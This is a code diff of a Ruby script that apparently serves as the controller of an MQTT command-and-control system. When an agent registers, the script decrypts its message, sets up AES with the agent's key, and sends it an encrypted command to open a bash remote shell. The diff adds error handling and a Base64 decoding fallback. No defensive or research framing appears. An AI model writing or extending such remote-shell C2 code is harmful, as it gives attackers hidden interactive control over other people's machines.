@@ -1,6 +1,7 @@
 require 'paho-mqtt'
 require 'securerandom'
 require 'os'
+require 'base64'
 
 require_relative 'core/encryption'
 require_relative 'core/serialization'
@@ -67,29 +68,36 @@ mqtt_client.on_connack do
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:shinobi]) do |packet|
-		topic = packet.topic.split('/')
-		agent = topic[3]
+		begin
+			topic = packet.topic.split('/')
+			agent = topic[3]
 
-	  packet = Encryption::RSA.decrypt(packet.payload)
-	  packet = Serialization.deserialize(packet)
+			packet = Encryption::RSA.decrypt(packet.payload)
+		  packet = Serialization.deserialize(packet)
 
-	  Encryption::AES.config({
-	  	:key_lenght => 128,
-	  	:mode => :CTR,
-	  	:key => packet.aes["key"],
-	  	:iv => packet.aes["iv"]
-	  })
+			puts packet
 
-		payload = { :shell =>  'bash' }
-		topic = mqtt_topics[:remoteshell_open].dup
-		topic['+'] = agent
+		  Encryption::AES.config({
+		  	:key_lenght => 128,
+		  	:mode => :CTR,
+		  	:key => packet.aes["key"],
+		  	:iv => packet.aes["iv"]
+		  })
 
-		payload = Serialization.serialize(payload)
-		payload = Encryption::AES.encrypt(payload)
+			payload = { :shell =>  'bash' }
+			topic = mqtt_topics[:remoteshell_open].dup
+			topic['+'] = agent
 
-		puts topic
+			payload = Serialization.serialize(payload)
+			payload = Encryption::AES.encrypt(payload)
 
-		mqtt_client.publish(topic, payload, false, 1)
+			mqtt_client.publish(topic, payload, false, 1)
+		rescue
+			packet = Base64.decode64(packet.payload)
+				packet = Encryption::AES.decrypt(packet)
+				packet = Serialization.deserialize(packet)
+				puts packet
+		end
 end
 
 mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_onopen]) do |packet|
